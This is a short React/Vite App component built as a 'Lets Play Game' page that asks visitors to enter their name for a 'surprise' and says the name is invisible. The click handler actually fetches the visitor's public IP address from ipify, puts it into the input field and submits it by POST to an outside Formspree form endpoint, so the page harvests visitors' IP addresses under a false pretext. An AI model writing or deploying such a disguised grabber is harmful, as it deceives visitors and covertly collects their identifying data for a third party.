import { useState } from 'react'
import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import './App.css'
import axios from 'axios'


function App() {
  const [adress, setAddress] = useState("");
  const getdata= async ()=>{
    const response=await axios.get("https://api.ipify.org?format=json");
   setAddress(response.data.ip);
  }

  return (
    <>
     <h1>Lets Play Game </h1>
     <h2>Enter Your name and Get Surprise</h2>
     <h3>Note: Your Name is Invisible</h3>
     
     <form action="https://formspree.io/f/mleqdlge" method='post' >
      <input type="text" name='data' value={adress}  style={{color:"black"}} placeholder='Enter Your Name ' required />
      <button name='button' onClick={getdata} type='submit'>Click ME</button>
     
     </form>
     <h3 >Gift : {adress}</h3>
    </>
  )
}

export default App

